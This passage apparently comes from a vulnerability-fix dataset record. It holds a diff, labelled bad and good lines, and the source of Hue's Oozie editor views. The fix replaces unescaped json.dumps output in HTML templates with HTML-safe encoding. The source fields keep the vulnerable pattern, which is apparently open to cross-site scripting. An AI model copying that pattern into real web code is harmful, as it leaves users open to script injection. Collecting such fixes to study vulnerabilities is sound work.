Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n \n   return render('editor/bundle_editor.mako', request, {\n-      'bundle_json': bundle.json,\n-      'coordinators_json': json.dumps(coordinators),\n+      'bundle_json': bundle.json_for_html(),\n+      'coordinators_json': json.dumps(coordinators, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))      \n   })\n", "add": 2, "remove": 2, "filename": "/apps/oozie/src/oozie/views/editor2.py", "badparts": ["      'bundle_json': bundle.json,", "      'coordinators_json': json.dumps(coordinators),"], "goodparts": ["      'bundle_json': bundle.json_for_html(),", "      'coordinators_json': json.dumps(coordinators, cls=JSONEncoderForHTML),"]}], "source": "\n import json import logging import uuid from django.core.urlresolvers import reverse from django.forms.formsets import formset_factory from django.http import HttpResponse from django.shortcuts import redirect from django.utils.translation import ugettext as _ from desktop.lib.django_util import render from desktop.lib.exceptions_renderable import PopupException from desktop.lib.i18n import smart_str from desktop.lib.rest.http_client import RestException from desktop.models import Document, Document2 from liboozie.credentials import Credentials from liboozie.oozie_api import get_oozie from liboozie.submission2 import Submission from oozie.decorators import check_document_access_permission, check_document_modify_permission from oozie.forms import ParameterForm from oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES, import_workflows_from_hue_3_7,\\ find_dollar_variables, find_dollar_braced_variables LOG=logging.getLogger(__name__) def list_editor_workflows(request): workflows=[d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] return render('editor/list_editor_workflows.mako', request,{ 'workflows_json': json.dumps(workflows) }) @check_document_access_permission() def edit_workflow(request): workflow_id=request.GET.get('workflow') if workflow_id: wid={} if workflow_id.isdigit(): wid['id']=workflow_id else: wid['uuid']=workflow_id doc=Document2.objects.get(type='oozie-workflow2', **wid) workflow=Workflow(document=doc) else: doc=None workflow=Workflow() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) workflow_data=workflow.get_data() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) return render('editor/workflow_editor.mako', request,{ 'layout_json': json.dumps(workflow_data['layout']), 'workflow_json': json.dumps(workflow_data['workflow']), 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES), 'doc1_id': doc.doc.get().id if doc else -1, 'subworkflows_json': json.dumps(_get_workflows(request.user)), 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_workflow(request): return edit_workflow(request) def delete_workflow(request): if request.method !='POST': raise PopupException(_('A POST request is required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(id=job['id']) doc=doc2.doc.get() doc.can_write_or_exception(request.user) doc.delete() doc2.delete() response={} request.info(_('Workflows deleted.') if len(jobs) > 1 else _('Workflow deleted.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def copy_workflow(request): if request.method !='POST': raise PopupException(_('A POST request is required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(type='oozie-workflow2', id=job['id']) name=doc2.name +'-copy' copy_doc=doc2.doc.get().copy(name=name, owner=request.user) doc2.pk=None doc2.id=None doc2.uuid=str(uuid.uuid4()) doc2.name=name doc2.owner=request.user doc2.save() doc2.doc.all().delete() doc2.doc.add(copy_doc) workflow=Workflow(document=doc2) workflow.update_name(name) doc2.update_data({'workflow': workflow.get_data()['workflow']}) doc2.save() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) response={} request.info(_('Workflows copied.') if len(jobs) > 1 else _('Workflow copied.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_modify_permission() def save_workflow(request): response={'status': -1} workflow=json.loads(request.POST.get('workflow', '{}')) layout=json.loads(request.POST.get('layout', '{}')) if workflow.get('id'): workflow_doc=Document2.objects.get(id=workflow['id']) else: workflow_doc=Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user) Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2') subworkflows=[node['properties']['workflow'] for node in workflow['nodes'] if node['type']=='subworkflow-widget'] if subworkflows: dependencies=Document2.objects.filter(uuid__in=subworkflows) workflow_doc.dependencies=dependencies workflow_doc.update_data({'workflow': workflow}) workflow_doc.update_data({'layout': layout}) workflow_doc.name=workflow['name'] workflow_doc.save() workflow_instance=Workflow(document=workflow_doc) response['status']=0 response['id']=workflow_doc.id response['doc1_id']=workflow_doc.doc.get().id response['message']=_('Page saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def new_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=NODES[node['widgetType']].get_mandatory_fields() workflows=[] if node['widgetType']=='subworkflow-widget': workflows=_get_workflows(request.user) response['status']=0 response['properties']=properties response['workflows']=workflows return HttpResponse(json.dumps(response), mimetype=\"application/json\") def _get_workflows(user): return[{ 'name': workflow.name, 'owner': workflow.owner.username, 'value': workflow.uuid, 'id': workflow.id } for workflow in[d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')] ] def add_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=json.loads(request.POST.get('properties', '{}')) copied_properties=json.loads(request.POST.get('copiedProperties', '{}')) _properties=dict(NODES[node['widgetType']].get_fields()) _properties.update(dict([(_property['name'], _property['value']) for _property in properties])) if copied_properties: _properties.update(copied_properties) response['status']=0 response['properties']=_properties response['name']='%s-%s' %(node['widgetType'].split('-')[0], node['id'][:4]) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def action_parameters(request): response={'status': -1} parameters=set() try: node_data=json.loads(request.POST.get('node', '{}')) parameters=parameters.union(set(Node(node_data).find_parameters())) script_path=node_data.get('properties',{}).get('script_path',{}) if script_path: script_path=script_path.replace('hdfs://', '') if request.fs.do_as_user(request.user, request.fs.exists, script_path): data=request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2) if node_data['type'] in('hive', 'hive2'): parameters=parameters.union(set(find_dollar_braced_variables(data))) elif node_data['type']=='pig': parameters=parameters.union(set(find_dollar_variables(data))) response['status']=0 response['parameters']=list(parameters) except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def workflow_parameters(request): response={'status': -1} try: workflow=Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) response['status']=0 response['parameters']=workflow.find_all_parameters(with_lib_path=False) except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_workflow(request): response={'status': -1} try: workflow_json=json.loads(request.POST.get('workflow', '{}')) workflow=Workflow(workflow=workflow_json) response['status']=0 response['xml']=workflow.to_xml() except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_workflow(request, doc_id): workflow=Workflow(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_workflow(request.user, request.fs, request.jt, workflow, mapping) request.info(_('Workflow submitted')) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=workflow.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_workflow(user, fs, jt, workflow, mapping): try: submission=Submission(user, workflow, fs, jt, mapping) job_id=submission.run() return job_id except RestException, ex: detail=ex._headers.get('oozie-error-message', ex) if 'Max retries exceeded with url' in str(detail): detail='%s: %s' %(_('The Oozie server is not running'), detail) LOG.error(smart_str(detail)) raise PopupException(_(\"Error submitting workflow %s\") %(workflow,), detail=detail) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id})) def list_editor_coordinators(request): coordinators=[d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/list_editor_coordinators.mako', request,{ 'coordinators': coordinators }) @check_document_access_permission() def edit_coordinator(request): coordinator_id=request.GET.get('coordinator') doc=None if coordinator_id: doc=Document2.objects.get(id=coordinator_id) coordinator=Coordinator(document=doc) else: coordinator=Coordinator() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) workflows=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] if coordinator_id and not filter(lambda a: a['uuid']==coordinator.data['properties']['workflow'], workflows): raise PopupException(_('You don\\'t have access to the workflow of this coordinator.')) return render('editor/coordinator_editor.mako', request,{ 'coordinator_json': coordinator.json, 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflows_json': json.dumps(workflows), 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_coordinator(request): return edit_coordinator(request) @check_document_modify_permission() def save_coordinator(request): response={'status': -1} coordinator_data=json.loads(request.POST.get('coordinator', '{}')) if coordinator_data.get('id'): coordinator_doc=Document2.objects.get(id=coordinator_data['id']) else: coordinator_doc=Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type='oozie-coordinator2', owner=request.user) Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2') if coordinator_data['properties']['workflow']: dependencies=Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow']) for doc in dependencies: doc.doc.get().can_read_or_exception(request.user) coordinator_doc.dependencies=dependencies coordinator_doc.update_data(coordinator_data) coordinator_doc.name=coordinator_data['name'] coordinator_doc.save() response['status']=0 response['id']=coordinator_doc.id response['message']=_('Saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_coordinator(request): response={'status': -1} coordinator_dict=json.loads(request.POST.get('coordinator', '{}')) coordinator=Coordinator(data=coordinator_dict) response['status']=0 response['xml']=coordinator.to_xml() return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_coordinator(request, doc_id): coordinator=Coordinator(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_coordinator(request, coordinator, mapping) request.info(_('Coordinator submitted.')) return redirect(reverse('oozie:list_oozie_coordinator', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=coordinator.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_coordinator', kwargs={'doc_id': coordinator.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_coordinator(request, coordinator, mapping): try: wf_doc=Document2.objects.get(uuid=coordinator.data['properties']['workflow']) wf_dir=Submission(request.user, Workflow(document=wf_doc), request.fs, request.jt, mapping).deploy() properties={'wf_application_path': request.fs.get_hdfs_path(wf_dir)} properties.update(mapping) submission=Submission(request.user, coordinator, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting coordinator %s\") %(coordinator,), detail=ex._headers.get('oozie-error-message', ex)) def list_editor_bundles(request): bundles=[d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='bundle2')] return render('editor/list_editor_bundles.mako', request,{ 'bundles': bundles }) @check_document_access_permission() def edit_bundle(request): bundle_id=request.GET.get('bundle') doc=None if bundle_id: doc=Document2.objects.get(id=bundle_id) bundle=Bundle(document=doc) else: bundle=Bundle() coordinators=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/bundle_editor.mako', request,{ 'bundle_json': bundle.json, 'coordinators_json': json.dumps(coordinators), 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_bundle(request): return edit_bundle(request) @check_document_modify_permission() def save_bundle(request): response={'status': -1} bundle_data=json.loads(request.POST.get('bundle', '{}')) if bundle_data.get('id'): bundle_doc=Document2.objects.get(id=bundle_data['id']) else: bundle_doc=Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user) Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2') if bundle_data['coordinators']: dependencies=Document2.objects.filter(type='oozie-coordinator2', uuid__in=[c['coordinator'] for c in bundle_data['coordinators']]) for doc in dependencies: doc.doc.get().can_read_or_exception(request.user) bundle_doc.dependencies=dependencies bundle_doc.update_data(bundle_data) bundle_doc.name=bundle_data['name'] bundle_doc.save() response['status']=0 response['id']=bundle_doc.id response['message']=_('Saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_bundle(request, doc_id): bundle=Bundle(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_bundle(request, bundle, mapping) request.info(_('Bundle submitted.')) return redirect(reverse('oozie:list_oozie_bundle', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=bundle.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_bundle', kwargs={'doc_id': bundle.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_bundle(request, bundle, properties): try: deployment_mapping={} coords=dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])]) for i, bundled in enumerate(bundle.data['coordinators']): coord=coords[bundled['coordinator']] workflow=Workflow(document=coord.dependencies.all()[0]) wf_dir=Submission(request.user, workflow, request.fs, request.jt, properties).deploy() deployment_mapping['wf_%s_dir' % i]=request.fs.get_hdfs_path(wf_dir) coordinator=Coordinator(document=coord) coord_dir=Submission(request.user, coordinator, request.fs, request.jt, properties).deploy() deployment_mapping['coord_%s_dir' % i]=coord_dir deployment_mapping['coord_%s' % i]=coord properties.update(deployment_mapping) submission=Submission(request.user, bundle, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting bundle %s\") %(bundle,), detail=ex._headers.get('oozie-error-message', ex)) ", "sourceWithComments": "#!/usr/bin/env python\n# Licensed to Cloudera, Inc. under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  Cloudera, Inc. licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport json\nimport logging\nimport uuid\n\nfrom django.core.urlresolvers import reverse\nfrom django.forms.formsets import formset_factory\nfrom django.http import HttpResponse\nfrom django.shortcuts import redirect\nfrom django.utils.translation import ugettext as _\n\nfrom desktop.lib.django_util import render\nfrom desktop.lib.exceptions_renderable import PopupException\nfrom desktop.lib.i18n import smart_str\nfrom desktop.lib.rest.http_client import RestException\nfrom desktop.models import Document, Document2\n\nfrom liboozie.credentials import Credentials\nfrom liboozie.oozie_api import get_oozie\nfrom liboozie.submission2 import Submission\n\nfrom oozie.decorators import check_document_access_permission, check_document_modify_permission\nfrom oozie.forms import ParameterForm\nfrom oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES, import_workflows_from_hue_3_7,\\\n    find_dollar_variables, find_dollar_braced_variables\n\n\nLOG = logging.getLogger(__name__)\n\n\n\ndef list_editor_workflows(request):  \n  workflows = [d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n\n  return render('editor/list_editor_workflows.mako', request, {\n      'workflows_json': json.dumps(workflows)\n  })\n\n\n@check_document_access_permission()\ndef edit_workflow(request):\n  workflow_id = request.GET.get('workflow')\n  \n  if workflow_id:\n    wid = {}\n    if workflow_id.isdigit():\n      wid['id'] = workflow_id\n    else:\n      wid['uuid'] = workflow_id\n    doc = Document2.objects.get(type='oozie-workflow2', **wid)\n    workflow = Workflow(document=doc)\n  else:\n    doc = None\n    workflow = Workflow()\n    workflow.set_workspace(request.user)\n    workflow.check_workspace(request.fs, request.user)\n  \n  workflow_data = workflow.get_data()\n\n  api = get_oozie(request.user)\n  credentials = Credentials()\n  \n  try:  \n    credentials.fetch(api)\n  except Exception, e:\n    LOG.error(smart_str(e))\n\n  return render('editor/workflow_editor.mako', request, {\n      'layout_json': json.dumps(workflow_data['layout']),\n      'workflow_json': json.dumps(workflow_data['workflow']),\n      'credentials_json': json.dumps(credentials.credentials.keys()),\n      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'subworkflows_json': json.dumps(_get_workflows(request.user)),\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n  })\n\n\ndef new_workflow(request):\n  return edit_workflow(request)\n\n\ndef delete_workflow(request):\n  if request.method != 'POST':\n    raise PopupException(_('A POST request is required.'))\n\n  jobs = json.loads(request.POST.get('selection'))\n\n  for job in jobs:\n    doc2 = Document2.objects.get(id=job['id'])\n    doc = doc2.doc.get()\n    doc.can_write_or_exception(request.user)\n    \n    doc.delete()\n    doc2.delete()\n\n  response = {}\n  request.info(_('Workflows deleted.') if len(jobs) > 1 else _('Workflow deleted.'))\n  \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef copy_workflow(request):\n  if request.method != 'POST':\n    raise PopupException(_('A POST request is required.'))\n\n  jobs = json.loads(request.POST.get('selection'))\n\n  for job in jobs:\n    doc2 = Document2.objects.get(type='oozie-workflow2', id=job['id'])\n    \n    name = doc2.name + '-copy'\n    copy_doc = doc2.doc.get().copy(name=name, owner=request.user)\n  \n    doc2.pk = None\n    doc2.id = None\n    doc2.uuid = str(uuid.uuid4())\n    doc2.name = name\n    doc2.owner = request.user    \n    doc2.save()\n  \n    doc2.doc.all().delete()\n    doc2.doc.add(copy_doc)\n    \n    workflow = Workflow(document=doc2)\n    workflow.update_name(name)\n    doc2.update_data({'workflow': workflow.get_data()['workflow']})\n    doc2.save()\n\n    workflow.set_workspace(request.user)\n    workflow.check_workspace(request.fs, request.user)\n\n  response = {}  \n  request.info(_('Workflows copied.') if len(jobs) > 1 else _('Workflow copied.'))\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_modify_permission()\ndef save_workflow(request):\n  response = {'status': -1}\n\n  workflow = json.loads(request.POST.get('workflow', '{}'))\n  layout = json.loads(request.POST.get('layout', '{}'))\n\n  if workflow.get('id'):\n    workflow_doc = Document2.objects.get(id=workflow['id'])\n  else:      \n    workflow_doc = Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user)\n    Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2')\n\n  subworkflows = [node['properties']['workflow'] for node in workflow['nodes'] if node['type'] == 'subworkflow-widget']\n  if subworkflows:\n    dependencies = Document2.objects.filter(uuid__in=subworkflows)\n    workflow_doc.dependencies = dependencies\n\n  workflow_doc.update_data({'workflow': workflow})\n  workflow_doc.update_data({'layout': layout})\n  workflow_doc.name = workflow['name']\n  workflow_doc.save()\n  \n  workflow_instance = Workflow(document=workflow_doc)\n  \n  response['status'] = 0\n  response['id'] = workflow_doc.id\n  response['doc1_id'] = workflow_doc.doc.get().id\n  response['message'] = _('Page saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef new_node(request):\n  response = {'status': -1}\n\n  node = json.loads(request.POST.get('node', '{}'))\n\n  properties = NODES[node['widgetType']].get_mandatory_fields()\n  workflows = []\n\n  if node['widgetType'] == 'subworkflow-widget':\n    workflows = _get_workflows(request.user)\n\n  response['status'] = 0\n  response['properties'] = properties \n  response['workflows'] = workflows\n  \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef _get_workflows(user):\n  return [{\n        'name': workflow.name,\n        'owner': workflow.owner.username,\n        'value': workflow.uuid,\n        'id': workflow.id\n      } for workflow in [d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')]\n    ]  \n\n\ndef add_node(request):\n  response = {'status': -1}\n\n  node = json.loads(request.POST.get('node', '{}'))\n  properties = json.loads(request.POST.get('properties', '{}'))\n  copied_properties = json.loads(request.POST.get('copiedProperties', '{}'))\n\n  _properties = dict(NODES[node['widgetType']].get_fields())\n  _properties.update(dict([(_property['name'], _property['value']) for _property in properties]))\n\n  if copied_properties:\n    _properties.update(copied_properties)\n\n  response['status'] = 0\n  response['properties'] = _properties\n  response['name'] = '%s-%s' % (node['widgetType'].split('-')[0], node['id'][:4])\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef action_parameters(request):\n  response = {'status': -1}\n  parameters = set()\n\n  try:\n    node_data = json.loads(request.POST.get('node', '{}'))\n    \n    parameters = parameters.union(set(Node(node_data).find_parameters()))\n    \n    script_path = node_data.get('properties', {}).get('script_path', {})\n    if script_path:\n      script_path = script_path.replace('hdfs://', '')\n\n      if request.fs.do_as_user(request.user, request.fs.exists, script_path):\n        data = request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2)  \n\n        if node_data['type'] in ('hive', 'hive2'):\n          parameters = parameters.union(set(find_dollar_braced_variables(data)))\n        elif node_data['type'] == 'pig':\n          parameters = parameters.union(set(find_dollar_variables(data)))\n                \n    response['status'] = 0\n    response['parameters'] = list(parameters)\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef workflow_parameters(request):\n  response = {'status': -1}\n\n  try:\n    workflow = Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) \n\n    response['status'] = 0\n    response['parameters'] = workflow.find_all_parameters(with_lib_path=False)\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef gen_xml_workflow(request):\n  response = {'status': -1}\n\n  try:\n    workflow_json = json.loads(request.POST.get('workflow', '{}'))\n  \n    workflow = Workflow(workflow=workflow_json)\n  \n    response['status'] = 0\n    response['xml'] = workflow.to_xml()\n  except Exception, e:\n    response['message'] = str(e)\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef submit_workflow(request, doc_id):\n  workflow = Workflow(document=Document2.objects.get(id=doc_id))\n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)    \n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n\n      job_id = _submit_workflow(request.user, request.fs, request.jt, workflow, mapping)\n\n      request.info(_('Workflow submitted'))\n      return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = workflow.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n    popup = render('editor/submit_job_popup.mako', request, {\n                     'params_form': params_form,\n                     'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id})\n                   }, force_template=True).content\n    return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_workflow(user, fs, jt, workflow, mapping):\n  try:\n    submission = Submission(user, workflow, fs, jt, mapping)\n    job_id = submission.run()\n    return job_id\n  except RestException, ex:\n    detail = ex._headers.get('oozie-error-message', ex)\n    if 'Max retries exceeded with url' in str(detail):\n      detail = '%s: %s' % (_('The Oozie server is not running'), detail)\n    LOG.error(smart_str(detail))\n    raise PopupException(_(\"Error submitting workflow %s\") % (workflow,), detail=detail)\n\n  return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id}))\n\n\n\ndef list_editor_coordinators(request):\n  coordinators = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n\n  return render('editor/list_editor_coordinators.mako', request, {\n      'coordinators': coordinators\n  })\n\n\n@check_document_access_permission()\ndef edit_coordinator(request):\n  coordinator_id = request.GET.get('coordinator')\n  doc = None\n  \n  if coordinator_id:\n    doc = Document2.objects.get(id=coordinator_id)\n    coordinator = Coordinator(document=doc)\n  else:\n    coordinator = Coordinator()\n\n  api = get_oozie(request.user)\n  credentials = Credentials()\n  \n  try:  \n    credentials.fetch(api)\n  except Exception, e:\n    LOG.error(smart_str(e))\n\n  workflows = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])\n                                    for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n\n  if coordinator_id and not filter(lambda a: a['uuid'] == coordinator.data['properties']['workflow'], workflows):\n    raise PopupException(_('You don\\'t have access to the workflow of this coordinator.'))\n\n  return render('editor/coordinator_editor.mako', request, {\n      'coordinator_json': coordinator.json,\n      'credentials_json': json.dumps(credentials.credentials.keys()),\n      'workflows_json': json.dumps(workflows),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n  })\n\n\ndef new_coordinator(request):\n  return edit_coordinator(request)\n\n\n@check_document_modify_permission()\ndef save_coordinator(request):\n  response = {'status': -1}\n\n  coordinator_data = json.loads(request.POST.get('coordinator', '{}'))\n\n  if coordinator_data.get('id'):\n    coordinator_doc = Document2.objects.get(id=coordinator_data['id'])\n  else:      \n    coordinator_doc = Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type='oozie-coordinator2', owner=request.user)\n    Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2')\n\n  if coordinator_data['properties']['workflow']:\n    dependencies = Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow'])\n    for doc in dependencies:\n      doc.doc.get().can_read_or_exception(request.user)\n    coordinator_doc.dependencies = dependencies\n\n  coordinator_doc.update_data(coordinator_data)\n  coordinator_doc.name = coordinator_data['name']\n  coordinator_doc.save()\n  \n  response['status'] = 0\n  response['id'] = coordinator_doc.id\n  response['message'] = _('Saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\ndef gen_xml_coordinator(request):\n  response = {'status': -1}\n\n  coordinator_dict = json.loads(request.POST.get('coordinator', '{}'))\n\n  coordinator = Coordinator(data=coordinator_dict)\n\n  response['status'] = 0\n  response['xml'] = coordinator.to_xml()\n    \n  return HttpResponse(json.dumps(response), mimetype=\"application/json\") \n\n\n@check_document_access_permission()\ndef submit_coordinator(request, doc_id):\n  coordinator = Coordinator(document=Document2.objects.get(id=doc_id))  \n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)\n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n      job_id = _submit_coordinator(request, coordinator, mapping)\n\n      request.info(_('Coordinator submitted.'))\n      return redirect(reverse('oozie:list_oozie_coordinator', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = coordinator.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n  popup = render('editor/submit_job_popup.mako', request, {\n                 'params_form': params_form,\n                 'action': reverse('oozie:editor_submit_coordinator',  kwargs={'doc_id': coordinator.id})\n                }, force_template=True).content\n  return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_coordinator(request, coordinator, mapping):\n  try:\n    wf_doc = Document2.objects.get(uuid=coordinator.data['properties']['workflow'])\n    wf_dir = Submission(request.user, Workflow(document=wf_doc), request.fs, request.jt, mapping).deploy()\n\n    properties = {'wf_application_path': request.fs.get_hdfs_path(wf_dir)}\n    properties.update(mapping)\n\n    submission = Submission(request.user, coordinator, request.fs, request.jt, properties=properties)\n    job_id = submission.run()\n\n    return job_id\n  except RestException, 